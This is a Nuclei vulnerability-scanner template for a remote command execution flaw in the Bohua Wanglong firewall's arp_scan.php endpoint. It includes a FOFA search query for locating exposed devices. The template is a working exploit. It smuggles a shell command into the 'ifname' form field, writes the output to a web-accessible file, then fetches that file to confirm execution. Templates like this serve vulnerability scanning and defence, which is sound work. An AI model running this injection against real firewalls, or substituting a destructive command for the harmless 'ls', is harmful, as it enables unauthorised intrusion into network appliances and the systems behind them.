id: bohuawanglong-fw-arp_scan-rce

info:
  name: 博华网龙 防火墙 arp_scan存在远程命令执行漏洞
  author: HuanXiong
  severity: critical
  tags: bohuawanglong,rce
  metadata: 
    fofa-query: title="博华网龙"

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
- raw:
  - |
    POST /firewall/arp_scan.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
    Connection: keep-alive
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 24

    scan=1&ifname=;ls>{{username}}.txt;

  - |
    GET /firewall/{{username}}.txt HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
    Connection: keep-alive
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate, br 

  matchers:
  - type: dsl
    dsl:
      - "status_code_2 == 200 && contains(body_2,'arp_scan.php')"